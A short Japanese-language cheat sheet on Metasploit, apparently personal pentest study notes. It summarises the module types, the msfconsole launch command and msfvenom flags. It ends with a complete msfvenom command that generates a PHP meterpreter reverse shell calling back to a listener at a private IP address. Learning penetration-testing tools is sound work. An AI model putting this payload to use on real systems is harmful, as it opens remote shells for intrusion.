# Metasploit
[公式ドキュメント](https://docs.metasploit.com)

## 概要
Exploitにつかえるツールがたくさん入ってるOSSのツール。Gitで開発に参加もできる。

Metasploitには以下4つのモジュールがある。攻撃するためのタイプではない。データ収集などができる。
- **Auxiliary** => 
- **Exploit** => ターゲットに侵入するためのExploitを実行できる。
- **Payloads** => RCE実行時のペイロード。ユーザ作成やシェルをつないだりといったことができる。
- **Post** => 初期侵入後にセッションからデータを収集・列挙する系のタスク

## Cheat Sheet
Metasploitを起動する。
```
msfconsole
```

## Msfvenom
[Msfvenomのドキュメント](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)

### CheatSheet

-p => カスタムペイロードを使う
-p --payload-options => ペイロードのオプションを表示
-e => エンコードを表示
-a => バイナリが実行されるアーキテクチャを選択
-b => バイナリに使わないバイナリ文字列を選択する。"\x80"とかをいれてNULL文字を含まないようにしたりとか。
-f => アウトプットのフォーマットを選択する。-f cにするとC言語のバイナリ文字列で出せたりする。
--list formats => formatオプションの使用できるオプション一覧を表示する。他のオプションもlist表示できる。

### コマンド集
phpのリバースシェルを生成する
```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.45.157 LPORT=4444 -f raw > shell.php
```